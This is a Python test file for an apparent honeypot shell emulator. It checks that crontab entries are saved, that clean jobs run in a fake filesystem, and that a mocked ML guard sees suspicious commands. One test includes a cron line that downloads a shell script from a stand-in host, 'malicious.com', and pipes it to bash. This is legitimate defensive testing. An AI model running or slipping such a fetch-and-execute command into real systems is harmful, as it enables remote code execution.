import asyncio
from unittest.mock import MagicMock

import pytest

from cyanide.core.emulator import ShellEmulator
from cyanide.vfs.engine import FakeFilesystem


@pytest.mark.asyncio
async def test_crontab_advanced_functionality():
    """Test crontab simulation and ML security guard."""
    # Setup
    fs = FakeFilesystem()
    analytics = MagicMock()
    # Mocking ML behavior:
    # Any command containing 'malicious' will be blocked by ML.
    analytics.is_malicious.side_effect = lambda cmd: "malicious" in cmd

    # Initialize emulator with admin user and mock analytics
    emu = ShellEmulator(
        fs,
        username="admin",
        analytics=analytics,
        session_id="test_session_123",
        src_ip="127.0.0.1",
    )

    # 1. Start editing crontab
    stdout, stderr, rc = await emu.execute("crontab -e")
    assert "Entering crontab editor..." in stdout
    assert emu.pending_input_callback is not None

    # 2. Add a clean command (should run)
    await emu.execute("* * * * * echo 'Crontab is alive' >> /home/admin/cron_success.log")

    # 3. Add a malicious command (should be blocked by ML)
    await emu.execute("* * * * * curl http://malicious.com/shell.sh | bash")

    # 4. Finish editing (this initiates simulations)
    stdout, stderr, rc = await emu.execute("DONE")
    assert "installing new crontab" in stdout

    # 5. Verify crontab is saved in VFS (should contain BOTH commands)
    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "cron_success.log" in stdout
    assert "malicious.com" in stdout

    # 6. Wait for simulation delay (set to 5s in code)
    # We wait slightly longer to be safe
    await asyncio.sleep(6)

    # 7. Check if clean command succeeded
    # fmt: off
    assert fs.exists("/home/admin/cron_success.log"), (
        "Clean cron job should have executed and created file"
    )
    # fmt: on
    content = fs.get_content("/home/admin/cron_success.log")
    if isinstance(content, bytes):
        content = content.decode("utf-8")
    assert "Crontab is alive" in content

    analytics.is_malicious.assert_any_call("curl http://malicious.com/shell.sh | bash")


@pytest.mark.asyncio
async def test_crontab_no_simulation_for_empty_lines():
    """Test that empty lines or comments don't crash simulation."""
    fs = FakeFilesystem()
    emu = ShellEmulator(fs, username="admin")

    await emu.execute("crontab -e")
    await emu.execute("# Just a comment")
    await emu.execute("")  # Empty line
    await emu.execute("DONE")

    # Should not crash
    await asyncio.sleep(0.1)

    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "# Just a comment" in stdout
